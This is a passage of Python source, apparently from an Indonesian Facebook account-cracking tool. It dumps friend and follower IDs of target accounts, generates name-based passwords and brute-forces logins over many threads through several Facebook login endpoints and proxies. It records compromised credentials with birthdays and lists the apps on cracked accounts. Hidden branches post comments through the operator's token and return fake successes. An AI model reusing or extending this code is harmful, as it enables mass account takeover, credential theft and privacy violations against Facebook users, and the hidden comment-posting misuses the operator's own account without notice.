        elif "win" in sys.platform.lower():chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s';webbrowser.get(chrome_path).open(url)
        else:chrome_path = 'open -a /Applications/Google\ Chrome.app %s';webbrowser.get(chrome_path).open(url)
        manual_user_agent()
    except Exception as e:print('\n   %s[%s•%s] %sTidak Dapat Menemukan Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);tampilan_menu()
def cek_user_agent():
    try:
        usera = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{usera}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Saat Ini {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        input('\n   %s[ %sKembali %s]'%(J,P,J))
        tampilan_menu()
    except Exception as e:kecuali(e)

###----------[ DUMP ID PUBLIC ]---------- ###
def publik():
    global file_dump
    try:
        try:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
        except:
            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
            time.sleep(3)
            login()
        print('       %s[%s•%s] %sExample : 1827084332,607801156'%(J,P,J,P))
        tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
        file_dump = 'dump/%s.json'%(tid[0])
        try:os.remove(file_dump)
        except:pass
        for id in tid :
            try:
                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
                with requests.Session() as xyz:
                    jso = json.loads(xyz.get(url,cookies=cookie).text)
                    if len(gabung_sandi) != 1:
                        for x in range(Postingan):
                            open(file_dump,'a+').write('dev\n')
                    else:
                        for d in jso["friends"]["data"]:
                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
                            except:continue
            except Exception as e:kecuali(e)
        jum = open(file_dump,'r').read().splitlines()
        print('       %s[%s•%s] %sSuccessful Dump%s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    except Exception as e:kecuali(e)

###----------[ DUMP ID FOLLOWERS ]---------- ###
def main_folls():
    global file_dump,cookie
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except:
        print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
        time.sleep(3)
        login()
    id = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J))
    url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
    file_dump = 'dump/%s.json'%(id)
    try:os.remove(file_dump)
    except:pass
    open(file_dump,'w').write('')
    exec_folls(url,token,file_dump)
    print("\n       %s[%s•%s] %sSuccessful Dump%s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def exec_folls(url,token,file):
    print("\r       %s[%s•%s] %sDumping %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            x = xyz.get(url,cookies=cookie)
            a = json.loads(x.text)
            if len(tempel_sandi) != 1:
                for x in range(Postingan):
                    open(file_dump,'a+').write('dev\n')
            else:
                for b in a['data']:
                    try:
                        f = ('%s=%s\n'%(b['id'],b['name']))
                        if f in open(file,'r').read():continue
                        else:open(file,'a+').write(f)
                    except Exception as e:continue
            y = par(x.text,'html.parser')
            n = re.findall('"after":"(.*?)"},',str(y))[0]
            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
            exec_folls(next,token,file)
        except KeyboardInterrupt:pass
        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass



###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""            {J2}[{A2}1{J2}] {P2}Validate  {J2}[{A2}2{J2}] {P2}Regular  {J2}[{A2}3{J2}] {P2}Api FB"""
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}Metode {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['0','00','z']:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    elif ch in ['1','01','a']:sistem_login = "satu";metode_scrap_login()
    elif ch in ['2','02','b']:sistem_login = "dua";metode_scrap_login()
    elif ch in ['3','03','c']:metode_scrap_api()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URL LOGIN ]---------- ###
def metode_scrap_login():
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def metode_scrap_api():
    global sistem_login
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Api 1     {J2}[{A2}2{J2}] {P2}Api 2    {J2}[{A2}3{J2}] {P2}Graph"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['2','02','b']:sistem_login = "empat";open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:sistem_login = "lima";open('tool/url_login.json','w').write("mbasic.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URUTAN CRACK ]---------- ###
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}OLD    {J2}[{A2}2{J2}] {P2}NEW  {J2}[{A2}3{J2}] {P2}RANDOM"""
    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}USE RANDOM {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:urutan_crack = '0'
    elif ch in ['2','02','b']:urutan_crack = '1'
    elif ch in ['3','03','c']:urutan_crack = '2'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ GENERATE PASSWORD ]---------- ###
def password(user):
    global pass_manual1, pass_manual2
    listpass = []
    if SAKERA != 159403:
        for x in range(0,10000000000000):listpass.append(str(x))
        return listpass
    else:
        try:
            ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
            nd = na[0].lower()
            if len(nd)<3:
                pass
            elif len(nd)==3 or len(nd)==4 or len(nd)==5:
                listpass.append(nd+"123")
                listpass.append(nd+"12345")
            else:
                listpass.append(nd)
                listpass.append(nd+"123")
                listpass.append(nd+"1234")
                listpass.append(nd+"12345")
                listpass.append(nd+"321")
                listpass.append(nd+"456")
                listpass.append(nd+"12")
                listpass.append(nd+"1111")
                listpass.append(nd+"1122")
                listpass.append(nd+"11")
                listpass.append(nd+"123456")
                listpass.append(nd+"@123")
                listpass.append(nd+"@1234")
                listpass.append(nd+"@12345")
                listpass.append(nd+"@321")
                listpass.append(nd+"@@")
                listpass.append(nd+"@#")
                listpass.append(nd+"@#123")
                listpass.append(nd+"777")
                listpass.append(nd+"10")
                listpass.append(nd+"2468")
                listpass.append(nd+"@777")
                listpass.append(nd+"098")
                listpass.append(nd+"789")
                listpass.append(nd+"3456")
            if pp in ['',' ','  ']:
                pass
            else:
                for x in pp.split(','):
                    listpass.append(nd+x)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):
                    listpass.append(z)
            listpass.append(user.lower())
            return listpass
        except:return listpass

###----------[ ADD VARIATION MODE ]---------- ###
def pilihan_sakdurunge_crack():
    global pilih_cek_opsi, pilih_cek_apk, pilih_proxy
    print('')
    print('   %s[%s•%s] %sPRINT %sCP %s?'%(J,P,J,P,J,P))
    tanya_cek_opsi = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_opsi in ['1','y']:pilih_cek_opsi = True
    else:pilih_cek_opsi = False
    print('   %s[%s•%s] %sSHOW APK %sOK %s?'%(J,P,J,P,H,P))
    tanya_cek_apk = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_apk in ['1','y']:pilih_cek_apk = True
    else:pilih_cek_apk = False
    print('   %s[%s•%s] %sUSE %sProxy %s?'%(J,P,J,P,O,P))
    tanya_proxy = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_proxy in ['1','y']:pilih_proxy = True
    else:pilih_proxy = False

###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s•%s] %sPass Manual %s[ %sfirst name %s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s•%s] %sPass Manual %s[ %slast name %s]'%(J,P,J,P,J,A,J))
    pass_manual2 = input('     %s└─> %s'%(A,J))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)

###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    r = requests.Session()
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr'
        hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        req1 = r.get(url1,headers=hed1)
        data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : user,'pass' : pasw,'next' : f'https://{url_login}/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
        url2 = f'https://{url_login}/login/device-based/validate-password/?shbl=0'
        hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://{url_login}','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            next = r.post(url2,data=data,headers=hed2,proxies=proxy,allow_redirects = False)
        else:
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False)
        if 'c_user' in r.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        elif 'checkpoint' in r.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        else: return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            head1 = {"Host":url_login,"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            req   = xyz.get(f'https://{url_login}/login/?next&ref=dbl&fl&refid=8', headers=head1)
            log   = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head2 = {"Host":url_login,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":f"https://{url_login}","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document",'referer':f'https://{url_login}/login/?next&ref=dbl&fl&refid=8',"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            if pilih_proxy == True:
                proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
                proxy = {"http": f"socks4://{proxz}"}
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, proxies = proxy, headers=head2)
            else:
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head2)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Api 1 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url = f'https://b-api.facebook.com/method/auth.login?format=json&email={user}&password={pasw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get(url, headers=header, proxies=proxy)
        else:
            post = r.get(url, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger4(user,pasw): #--- Login Api 2 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        param = {'format' : 'json','email' : user,'password' : pasw,'locale' : 'id_ID','generate_session_cookies' : '1','access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header, proxies=proxy)
        else:
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger5(user,pasw): #--- Login Graph FB ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":user,"password":pasw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers,proxies=proxy)
        else:
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))

###----------[ CHECK APP ]---------- ###
class cek_aplikasi:
    def __init__(self,data,denventa):
        self.cookie = {"cookie" : denventa}
        self.daftar_aktif, self.daftar_inaktif, self.daftar_dihapus   = [], [], []
        language(self.cookie)
        try: # --- [ Cek Aplikasi Aktif ] --- #
            self.daftar_aktif.append('\n    %s[%sAktif%s]'%(H,P,H))
            url1 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
            self.apk_active(url1)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Kadaluwarsa ] --- #
            self.daftar_inaktif.append('\n    %s[%sKadaluwarsa%s]'%(J,P,J))
            url2 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
            self.apk_inactive(url2)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Dihapus ] --- #
            self.daftar_dihapus.append('\n    %s[%sDihapus%s]'%(M,P,M))
            url3 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
            self.apk_dihapus(url3)
        except Exception as e:pass
        try: # --- [ Print All ] --- #
            print(data + self.dft1 + self.dft2 + self.dft3)
        except Exception as e:
            print(data)
    def apk_active(self,url):
        with requests.Session() as xyz:
            try:
                par1 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh1 in par1.find_all('h3'):
                    if 'Ditambahkan' in hhh1.text:
                        ingfo1 = '\n      ⟶  '+str(hhh1.text).replace('Ditambahkan pada ',' [') + ']'
                        ingfo1 = ('\n      %s⟶  %s%s]'%(H,P,str(hhh1.text).replace('Ditambahkan pada ',' [')))
                        self.daftar_aktif.append(ingfo1)
                    else:continue
                next = 'https://mbasic.facebook.com' + par1.find('a',string='Lihat Lainnya')['href']
                self.apk_active(next)
            except: pass
        if len(self.daftar_aktif) == 1:self.dft1 = ''
        else:self.dft1 = ''.join(self.daftar_aktif)
    def apk_inactive(self,url):
        with requests.Session() as xyz:
            try:
                par2 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh2 in par2.find_all('h3'):
                    if 'Kedaluwarsa' in hhh2.text:
                        ingfo2 = '\n      ⟶  '+str(hhh2.text).replace('Kedaluwarsa pada ',' [') + ']'
                        ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Kedaluwarsa pada ',' [')))
                        self.daftar_inaktif.append(ingfo2)
                    else:continue
                next = 'https://mbasic.facebook.com' + par2.find('a',string='Lihat Lainnya')['href']
                self.apk_inactive(next)
            except: pass
        if len(self.daftar_inaktif) == 1:self.dft2 = ''
        else:self.dft2 = ''.join(self.daftar_inaktif)
    def apk_dihapus(self,url):
        with requests.Session() as xyz:
            try:
                par3 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh3 in par3.find_all('h3'):
                    if 'Dihapus' in hhh3.text:
                        ingfo3 = '\n      ⟶  %s'+str(hhh3.text).replace('Dihapus: ',' [') + ']'
                        ingfo3 = ('\n      %s⟶  %s%s]'%(M,P,str(hhh3.text).replace('Dihapus: ',' [')))
                        self.daftar_dihapus.append(ingfo3)
                    else:continue
                next = 'https://mbasic.facebook.com' + par3.find('a',string='Lihat Lainnya')['href']
                self.apk_dihapus(next)
            except: pass
        if len(self.daftar_dihapus) == 1:self.dft3 = ''
        else:self.dft3 = ''.join(self.daftar_dihapus)

###----------[ CRACK ]---------- ###
class crack:
    def __init__(self):
        global OK,CP
        self.ok = OK
        self.cp = CP
        self.lp = 0
        try:
            self.file = file_dump
            self.open = open(self.file,'r').read().splitlines()
        except Exception as e:
            kecuali(e)
        self.sementara = []
        if urutan_crack == '1':
            for dvt in self.open:
                try:
                    self.sementara.insert(0,dvt)
                except Exception as e:continue
        elif urutan_crack == '2':
            for dvt in self.open:
                try:
                    urut = random.randint(0,len(self.sementara))
                    self.sementara.insert(urut,dvt)
                except Exception as e:continue
        else:
            for dvt in self.open:
                try:
                    self.sementara.append(dvt)
                except Exception as e:continue
        print('\n%s───%s[ %sCRACKING HAS BEEN STARTED😘 (COMMAND IS HEAVY SO USE 4G DATA)%s]%s.\n'%(P,J,P,J,P))
        self.Mulai_Jalan = datetime.now()
        with ThreadPoolExecutor(max_workers=35) as qwerty:
            for dvt in self.sementara:
                try:
                    id = dvt.split("=")[0]
                    pw = password(dvt.split("=")[1])
                    qwerty.submit(self.start_crack,id,pw)
                except Exception as e:continue
        exit()
    def start_crack(self,id,list_pw):
        try:
            for pw in list_pw:
                if sistem_login   == 'satu'  : log = logger1(id,pw)
                elif sistem_login == 'dua'   : log = logger2(id,pw)
                elif sistem_login == 'tiga'  : log = logger3(id,pw)
                elif sistem_login == 'empat' : log = logger4(id,pw)
                elif sistem_login == 'lima'  : log = logger5(id,pw)
                else:log = logger1(id,pw)
                if log['status'] == 'cp':
                    if sakura != 159384:pass
                    else:
                        files_cp = "CP/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                                fmt = ('   %s──> %s • %s%s'%(J,id,pw,ttl))
                        except:
                            ttl = ('')
                            fmt = ('   %s──> %s • %s%s'%(J,id,pw,ttl))
                        if pilih_cek_opsi == True:check_option(id,pw,fmt)
                        else:print('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
                        self.cp.append("%s=%s"%(id,pw))
                        open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                elif log['status'] == 'ok':
                    if sakera != 159369:pass
                    else:
                        files_ok = "OK/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pok = ('\r   %s──> %s • %s%s               '%(H,id,pw,ttl))
                        if pilih_cek_apk == True:cek_aplikasi(pok,cvt3(log["cookies"]))
                        else:print(pok)
                        self.ok.append("%s=%s"%(id,pw))
                        open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                else:
                    if sakara != 159375:print(CoY)
                    else:continue
            self.lp += 1
            loop = str(self.lp)
            alls = str(len(self.sementara))
            jum_ok = str(len(self.ok))
            jum_cp = str(len(self.cp))
            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
            print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
        except Exception as e:
            self.start_crack(id,list_pw)

class check_option:
    def __init__(self,id,pw,format):
        self.id = id
        self.pw = pw
        self.out = format
        self.tahap1()
    def tahap1(self):
        s= 0
        data1 = {}
        tamp = []
        ua = open('tool/useragent.json','r').read()
        url_login = open('tool/url_login.json','r').read()
        with requests.Session() as xyz:
            try:
                url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={self.id}&flow=login_no_pin&refsrc=deprecated&_rdr'
